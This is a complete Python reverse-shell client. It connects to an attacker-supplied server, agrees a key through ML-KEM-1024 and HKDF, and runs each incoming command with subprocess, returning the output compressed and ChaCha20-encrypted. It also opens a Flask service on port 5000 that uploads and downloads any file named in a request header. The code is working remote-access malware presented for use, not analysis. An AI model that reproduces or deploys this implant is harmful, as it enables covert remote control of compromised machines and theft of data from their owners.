#!/usr/bin/env python3

import argparse
import socket
import subprocess
import threading

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from zstandard import ZstdCompressor, ZstdDecompressor
from cryptography.hazmat.primitives import hashes
from flask import Flask, jsonify, request
from kyber_py.ml_kem import ML_KEM_1024

key = ''
nonce = ''

app = Flask(__name__)

def run_flask():
    app.run(host='0.0.0.0', port=5000)

@app.route('/upload', methods=['POST'])
def upload():
    file_bytes = request.get_data()
    if not file_bytes:
        return jsonify({"error": "No data received"}), 400
    filename = request.headers.get('Filename')
    file_decrypted = chacha20_decrypt(file_bytes, key, nonce)
    file_decompressed = ZstdDecompressor().decompress(file_decrypted)
    try:
        with open(filename, "wb") as f:
            f.write(file_decompressed)
        return jsonify({"message": "File uploaded"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
@app.route('/download', methods=['POST'])
def download():
    filename = request.headers.get('Filename')
    if not filename:
        return jsonify({"error": "Filename is missing"}), 400
    try:
        with open(filename, "rb") as f:
            file_data = f.read()
        file_compressed = ZstdCompressor().compress(file_data)
        file_encrypted = chacha20_encrypt(file_compressed, key, nonce)
        return file_encrypted, 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


def chacha20_encrypt(data, key, nonce):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data)

def chacha20_decrypt(data, key, nonce):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(data)

def reverse_shell(server_ip, server_port):
    global key, nonce
    mlkem = ML_KEM_1024
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    try:
        server_public_key = client.recv(4096)

        shared_key, ciphertext = mlkem.encaps(server_public_key)
        client.send(ciphertext)

        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=48,
            salt=None,
            info=b'handshake data',
            backend=default_backend()
        ).derive(shared_key)

        key = derived_key[:32]
        nonce = derived_key[32:48]

        while True:
            encrypted_command = client.recv(4096)
            if not encrypted_command:
                break
            command = chacha20_decrypt(encrypted_command, key, nonce)
            command = ZstdDecompressor().decompress(command).decode('utf-8')

            if command.lower() == "exit":
                client.close()
                break

            output = subprocess.getoutput(command)
            if output == "" or output is None:
                output = "No output"

            output = ZstdCompressor().compress(output.encode('utf-8'))
            encrypted_output = chacha20_encrypt(output, key, nonce)
            client.send(encrypted_output)

    except Exception as e:
        print(f"[!] Error: {e}")
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--server", required=True, help="Server IP address")
    parser.add_argument("-p", "--port", required=True, type=int, help="Server port")
    args = parser.parse_args()

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    reverse_shell(args.server, args.port)